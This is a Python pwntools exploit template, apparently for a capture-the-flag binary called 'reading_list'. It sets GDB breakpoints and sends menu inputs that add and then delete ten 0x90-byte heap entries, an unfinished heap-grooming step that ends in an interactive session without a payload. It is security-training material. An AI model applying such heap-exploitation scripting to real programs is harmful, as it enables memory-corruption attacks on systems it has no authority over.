#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template reading_list
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('reading_list')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *remove_book+206
b *add_book+86
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
io.sendline(b'lmao')

def add_book(name):
    io.sendline(b'2')
    io.sendline(name)

def delete_book(idx):
    io.sendline(b'3')
    io.sendline(idx)

for i in range(10):
    add_book(b'A'*0x90)

for i in range(10):
    delete_book(str(i))

io.interactive()

